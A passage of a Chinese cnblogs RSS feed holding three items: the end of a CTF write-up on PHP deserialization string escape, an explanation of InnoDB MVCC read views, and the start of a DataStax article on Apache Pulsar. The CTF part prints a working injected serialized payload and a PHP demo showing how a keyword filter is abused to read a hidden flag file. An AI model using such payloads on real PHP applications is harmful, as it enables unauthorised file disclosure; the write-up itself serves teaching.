&lt;code class=&quot;language-php&quot;&gt;a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:40:&quot;1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5&quot;;}
a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:2:&quot;22&quot;;s:3:&quot;img&quot;;s:40:&quot;1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5&quot;;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;截断只需&lt;code&gt;}&lt;/code&gt;即可,并且不为读取的字符即可,因此添加&lt;code&gt;f&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;}&lt;/code&gt;,这里我们新增了一个元素,因此吞噬后&lt;code&gt;function&lt;/code&gt;元素消失了,随便补充好元素即可.&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;原理解析-1&quot;&gt;原理解析&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$arr = array(
    &quot;user&quot;=&amp;gt;&quot;flagflagflagflagflagflag&quot;,
    &quot;function&quot;=&amp;gt;'2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;}',
    //&quot;user&quot;=&amp;gt;'guest',
    //&quot;function&quot;=&amp;gt;'show_image',
    &quot;img&quot;=&amp;gt;sha1(base64_encode('guest_img.png'))
);

print_r(serialize($arr));
echo PHP_EOL;
print_r(filter(serialize($arr)));
echo PHP_EOL;
print_r(unserialize(filter(serialize($arr))));

?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;输出展示&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;a:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:62:&quot;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;}&quot;;s:3:&quot;img&quot;;s:40:&quot;1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5&quot;;}
a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:62:&quot;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;}&quot;;s:3:&quot;img&quot;;s:40:&quot;1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5&quot;;}
Array
(
    [user] =&amp;gt; &quot;;s:8:&quot;function&quot;;s:62:&quot;2
    [img] =&amp;gt; ZDBnM19mMWFnLnBocA==
    [tql] =&amp;gt; tql
)
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 19 Feb 2021 15:05:00 +0000</pubDate>
<dc:creator>Pan3a</dc:creator>
<og:description>通过CTF比赛了解PHP反序列化。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Pan3a/p/14418641.html</dc:identifier>
</item>
<item>
<title>对Innodb中MVCC的理解 - 玉树临枫</title>
<link>http://www.cnblogs.com/yuanfy008/p/14417512.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuanfy008/p/14417512.html</guid>
<description>&lt;p&gt;　　MVCC (Multiversion Concurrency Control) 中文全程叫&lt;span&gt;&lt;strong&gt;多版本并发控制&lt;/strong&gt;&lt;/span&gt;，是现代数据库（如MySql）引擎实现中常用的&lt;strong&gt;处理读写冲突&lt;/strong&gt;的手段，目的在于&lt;strong&gt;提高数据库高并发场景下的吞吐性能&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;　　MySQL的InnoDB存储引擎默认事务隔离级别是RR(可重复读)，是通过 &quot;行级锁+MVCC&quot;一起实现的，正常读的时候不加锁，写的时候加锁。而 &lt;span&gt;MCVV 的实现依赖：隐藏字段、Read View、Undo log&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;　　另外MVCC只在 Read Committed 和 Repeatable Read两个隔离级别下工作，其他两个隔离级别和MVCC不兼容：&lt;/p&gt;
&lt;div readability=&quot;58.01702808907&quot;&gt;
&lt;ul&gt;&lt;li&gt;Read Uncommitted总是读取最新的记录行，不需要MVCC的支持；&lt;/li&gt;
&lt;li&gt;Serializable 则会对所有读取的记录行都加锁，单靠MVCC无法完成。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;1、事务版本号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　每次事务开启前都会从数据库获得一个自增长的事务ID，可以从事务ID判断事务的执行先后顺序。&lt;/p&gt;
&lt;p&gt;　　可以通过这样的命令来查看：select TRX_ID from INFORMATION_SCHEMA.INNODB_TRX;&lt;/p&gt;

&lt;div readability=&quot;6.125&quot;&gt;&lt;strong&gt;2、隐藏字段&lt;/strong&gt;（Innodb 为每行额外添加了3个字段，具体请参考&lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/innodb-multi-versioning.html&quot;&gt;官方文档&lt;/a&gt;）：&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;DB_TRX_ID&lt;/strong&gt;：大小为6个字节。指插入或更新该行的最后一个事务的事务标识符，也就是事务ID。 此外，删除在内部被视为更新，在该更新中，该行中的特殊位被设置为将其标记为已删除。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DB_ROLL_PTR&lt;/strong&gt;：大小为7个字节。表示指向该行回滚段的指针。 回滚指针指向写入回滚段的撤消日志记录。 如果行已更新，则撤消日志记录将包含在更新行之前重建行内容所必需的信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DB_ROW_ID&lt;/strong&gt;：大小为6个字节。包含一个行ID，该行ID随着插入新行而单调增加。 如果InnoDB自动生成聚集索引，则该索引包含行ID值。 否则，DB_ROW_ID列不会出现在任何索引中。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/690169/202102/690169-20210219225053349-2091811633.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;3、Undo log&lt;/strong&gt;&lt;/p&gt;

&lt;div&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/690169/202102/690169-20210219225103405-1578959954.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;4、read view&lt;/strong&gt;&lt;/p&gt;
&lt;div readability=&quot;32.691588785047&quot;&gt;
&lt;p&gt;“InnoDB支持MVCC多版本，其中RC（Read Committed）和RR（Repeatable Read）隔离级别是利用consistent read view（一致读视图）方式支持的。所谓consistent read view就是在某一时刻给事务系统trx_sys打snapshot（快照），把当时trx_sys状态（包括活跃读写事务数组）记下来，之后的所有读操作根据其事务ID（即trx_id）与snapshot中的trx_sys的状态作比较，以此判断read view对于事务的可见性。&lt;/p&gt;
&lt;div readability=&quot;8.6115107913669&quot;&gt;RR隔离级别（除了Gap锁之外）和RC隔离级别的差别是创建snapshot时机不同。 RR隔离级别是在事务开始时刻，确切地说是第一个读操作创建read view的；RC隔离级别是在语句开始时刻创建read view的（详见&lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/innodb-consistent-read.html&quot;&gt;官方文档&lt;/a&gt;）。”&lt;/div&gt;

&lt;div readability=&quot;6.5227272727273&quot;&gt;Read view中保存的trx_sys状态主要包括（以下字段解释来源于&lt;a href=&quot;https://github.com/twitter-forks/mysql/blob/master/storage/innobase/include/read0read.h#L124&quot;&gt;源码&lt;/a&gt;）：&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;trx_ids&lt;/strong&gt;: 为活跃事务id列表，即Read View初始化时当前未提交的事务列表。所以当进行RR读的时候，trx_ids中的事务对于本事务是不可见的（除了自身事务，自身事务对于表的修改对于自己当然是可见的）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;low_limit_id&lt;/strong&gt;: 当前最大的事务id + 1，事务id &amp;gt;= low_limit_id，对于当前Read View都是不可见的。理解起来就是在创建Read View视图的时候，之后创建的事务对于该事务肯定是不可见的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;up_limit_id&lt;/strong&gt;: 当前已经提交的事务id + 1，事务id &amp;lt; up_limit_id ，对于当前Read View都是可见的。 理解起来就是在创建Read View视图的时候，之前已经提交的事务对于该事务肯定是可见的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;creator_trx_id&lt;/strong&gt;: 创建当前read view的事务版本号；&lt;/p&gt;
&lt;p&gt;&lt;span&gt;一旦一个Read View被创建，这三个参数将不再发生变化，理解这点很重要，其中low_limit_id 和 up_limit_id分别是 trx_Ids数组的上下界（注意：从单词上来区分的话很容易弄反）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其他事务对当前事务的可见性判断如下：&lt;/p&gt;
&lt;div&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/690169/202102/690169-20210219225116796-1219781054.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;下面通过案例来分析MVCC怎么实现一致性读取的。前期数据准备：&lt;/p&gt;
&lt;div&gt;
&lt;ul&gt;&lt;li&gt;使用默认隔离级别RR；&lt;/li&gt;
&lt;li&gt;创建一个表： create table test(id int AUTO_INCREMENT, score int, primary key(id)) AUTO_INCREMENT = 0;&lt;/li&gt;
&lt;li&gt;假设当前事务id已经自增长到100；&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;
&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;col/&gt;&lt;col/&gt;&lt;col/&gt;&lt;/colgroup&gt;&lt;tbody readability=&quot;16&quot;&gt;&lt;tr&gt;&lt;td data-cell-id=&quot;UMqp-1613730095896&quot;&gt;
&lt;p&gt;步骤&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;ePXQ-1613730095896&quot;&gt;
&lt;p&gt;事务1&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;DitE-1613730095896&quot;&gt;
&lt;p&gt;事务2&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;txLd-1613730095896&quot;&gt;
&lt;p&gt;事务3&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td data-cell-id=&quot;QdoC-1613730095896&quot;&gt;
&lt;p&gt;1&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;CXiy-1613730095896&quot;&gt;
&lt;p&gt;begin;&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;RkLs-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;wMST-1613730095896&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td data-cell-id=&quot;AAMS-1613730095896&quot;&gt;
&lt;p&gt;2&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;08fB-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;ps5p-1613730095896&quot;&gt;
&lt;p&gt;begin;&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;vdpF-1613730095896&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td data-cell-id=&quot;kMXj-1613730095896&quot;&gt;
&lt;p&gt;3&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;4tKH-1613730095896&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;insert into test(score) select 101;&lt;/p&gt;
&lt;p&gt;此时事务ID为101&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;Tkzk-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;Vd65-1613730095896&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td data-cell-id=&quot;1A1O-1613730095896&quot;&gt;
&lt;p&gt;4&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;45ZT-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;Aa5o-1613730095896&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;insert into test(score) select 102;&lt;/p&gt;
&lt;p&gt;此时事务ID为102&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;obx9-1613730095896&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td data-cell-id=&quot;0QSK-1613730095896&quot;&gt;
&lt;p&gt;5&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;LJDr-1613730095896&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;select * from test;&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| id | score |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| 1 | 101 |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;此时就会创建read view&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;up_limit_id = 101&lt;/p&gt;
&lt;p&gt;low_limit_id = 103&lt;/p&gt;
&lt;p&gt;trx_ids为(101,102)&lt;/p&gt;
&lt;p&gt;&lt;span&gt;而101自身可见，102在活跃事务列表中不可见&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;GYVH-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;zc49-1613730095896&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td data-cell-id=&quot;wKeD-1613730095896&quot;&gt;
&lt;p&gt;6&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;hvn6-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;5sco-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;rJtJ-1613730095896&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;insert into test(score) select 103;&lt;/p&gt;
&lt;p&gt;此时事务ID为103&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td data-cell-id=&quot;oOKb-1613730095896&quot;&gt;
&lt;p&gt;7&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;ECEu-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;RSVy-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;9PXn-1613730095896&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;insert into test(score) select 104;&lt;/p&gt;
&lt;p&gt;此时事务ID为104&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td data-cell-id=&quot;NiNX-1613730095896&quot;&gt;
&lt;p&gt;8&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;1R79-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;nEuJ-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;aWjG-1613730095896&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;nsert into test(score) select 105;&lt;/p&gt;
&lt;p&gt;此时事务ID为105&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;8.5&quot;&gt;&lt;td data-cell-id=&quot;BA5X-1613730095896&quot;&gt;
&lt;p&gt;9&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;uvtL-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;Fdzq-1613730095896&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;ois0-1613730095896&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;select * from test;&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| id | score |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| 3 | 103 |&lt;/p&gt;
&lt;p&gt;| 4 | 104 |&lt;/p&gt;
&lt;p&gt;| 5 | 105 |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;此时的up_limit_id=101，&lt;/p&gt;
&lt;p&gt;&lt;span&gt;low_limit_id=106&lt;/span&gt;，&lt;/p&gt;
&lt;p&gt;trx_ids为（101, 102），&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;而101和102在trx_ds列表中不可见&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;10.5&quot;&gt;&lt;td data-cell-id=&quot;etvp-1613730095897&quot;&gt;
&lt;p&gt;10&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;F0DX-1613730095897&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;rrm2-1613730095897&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;select * from test;&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| id | score |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| 2 | 102 |&lt;/p&gt;
&lt;p&gt;| 3 | 103 |&lt;/p&gt;
&lt;p&gt;| 4 | 104 |&lt;/p&gt;
&lt;p&gt;| 5 | 105 |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;此时就会创建read view：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;up_limit_id=101，&lt;/p&gt;
&lt;p&gt;&lt;span&gt;low_limit_id=106，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;trx_ids为（101, 102），&lt;/p&gt;
&lt;p&gt;&lt;span&gt;102自身可见，101在活跃事务列表中不可见&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;而103、104、105不在trx_ids列表中所有可见&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;Vmge-1613730095897&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;11.5&quot;&gt;&lt;td data-cell-id=&quot;orHJ-1613730095897&quot;&gt;
&lt;p&gt;11&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;k64N-1613730095897&quot; readability=&quot;14&quot;&gt;
&lt;p&gt;select * from test;&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| id | score |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;| 1 | 101 |&lt;/p&gt;
&lt;p&gt;| 3 | 103 |&lt;/p&gt;
&lt;p&gt;| 4 | 104 |&lt;/p&gt;
&lt;p&gt;| 5 | 105 |&lt;/p&gt;
&lt;p&gt;+----+-------+&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;由于事务内read view不变&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（与RC的区别就在这），&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;此时的up_limit_id=101，low_limit_id=103，&lt;/p&gt;
&lt;p&gt;trx_ids为（101, 102），&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;101自身可见，102在活跃事务列表中不可见&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;而&amp;gt;=103的都不可见&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;rr1H-1613730095897&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;ic98-1613730095897&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;

&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;　　1、MVCC主要靠Read view来实现一致性读，也就是快照读；底层是主要基于其中两个隐藏字段来实现（DB_TRX_ID、DB_ROLL_PTR）。这样可以使不同事务的读-写、写-读操作并发执行，从而提升系统性能。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　2、Read view其中几个重要组成属性（trx_ids、low_limit_id、up_limit_id、creator_trx_id），一旦一个Read View被创建，这三个参数将不再发生变化；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　3、MVCC只在 RC 和 RR两个隔离级别下工作， 它们的不同之处在于：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　RR：read view是在first touch read时创建的，也就是执行事务中的第一条SELECT语句的瞬间，后续所有的SELECT都是复用这个read view，所以能保证每次读取的一致性（可重复读的语义）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　RC：每次读取，都会创建一个新的read view。这样就能读取到其他事务已经COMMIT的内容。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　所以对于InnoDB来说，RR虽然比RC隔离级别高，但是开销反而相对少。&lt;/p&gt;
&lt;p&gt;　　补充：RU的实现就简单多了，不使用read view，也不需要管什么DB_TRX_ID和DB_ROLL_PTR，直接读取最新的record即可。&lt;/p&gt;




&lt;/div&gt;
</description>
<pubDate>Fri, 19 Feb 2021 14:53:00 +0000</pubDate>
<dc:creator>玉树临枫</dc:creator>
<og:description>一、什么是MVCC MVCC (Multiversion Concurrency Control)&amp;#160;中文全程叫多版本并发控制，是现代数据库（如MySql）引擎实现中常用的处理读写冲突的手段，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yuanfy008/p/14417512.html</dc:identifier>
</item>
<item>
<title>行业动态 | Apache Pulsar 对现代数据堆栈至关重要的四个原因 - DataStax</title>
<link>http://www.cnblogs.com/datastax/p/14418578.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/datastax/p/14418578.html</guid>
<description>&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;r41c-0-0&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span data-offset-key=&quot;r41c-0-0&quot;&gt;与 Kafka 相比，Pulsar 的架构使它在跨地域复制、扩展、多租户和队列等方面具有重要的优势。&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;ccs8e-0-0&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span data-offset-key=&quot;ccs8e-0-0&quot;&gt;1 月 27 日，DataStax 宣布收购Kesque（Pulsar 即服务），加入到了 Pulsar 社区，并开源了 Kesque 团队在Luna Streaming中构建的管理和监控工具。&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;1uqc3-0-0&quot; readability=&quot;9&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;1uqc3-0-0&quot;&gt;多年来，DataStax 一直专注于消息传递。一个非常重要的原因是基于微服务的架构日益普及。简单来说，微服务架构使用消息总线来解耦服务之间的通信，并简化重放、错误处理和负载峰值。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;img src=&quot;https://pic4.zhimg.com/80/v2-a7f95d795a7f0d9337094e961e9d0874_1440w.png&quot; width=&quot;906&quot; height=&quot;366&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;590&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic1.zhimg.com/v2-a7f95d795a7f0d9337094e961e9d0874.png&quot; data-watermark-src=&quot;https://pic4.zhimg.com/v2-cc5582ac5f8e1b28f9c4eb119b2bf0bb.png&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;f20dd-0-0&quot; readability=&quot;7&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;f20dd-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;有了 Cassandra 和 Astra，开发者和架构师就有了这样一个数据库生态系统：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;ol class=&quot;public-DraftStyleDefault-ol&quot; data-offset-key=&quot;ena01-0-0&quot; readability=&quot;-1&quot;&gt;&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-reset public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;ena01-0-0&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;ena01-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;以开源为基础&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;fed84-0-0&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;fed84-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;非常适合混合云和多云部署&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;78i6m-0-0&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;78i6m-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;云原生，按消费计价&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;eni59-0-0&quot; readability=&quot;7&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;eni59-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;目前还没有满足这些需求的消息传递解决方案，因此，我们正在构建一个。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;5cfa8-0-0&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;5cfa8-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;我们从评估最流行的 Apache Kafka 开始。我们发现它在四个方面存在不足：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;ol class=&quot;public-DraftStyleDefault-ol&quot; data-offset-key=&quot;96hbk-0-0&quot;&gt;&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-reset public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;96hbk-0-0&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;96hbk-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;跨地域复制&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;365h9-0-0&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;365h9-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;扩展&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;fb0rk-0-0&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;fb0rk-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;多租户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
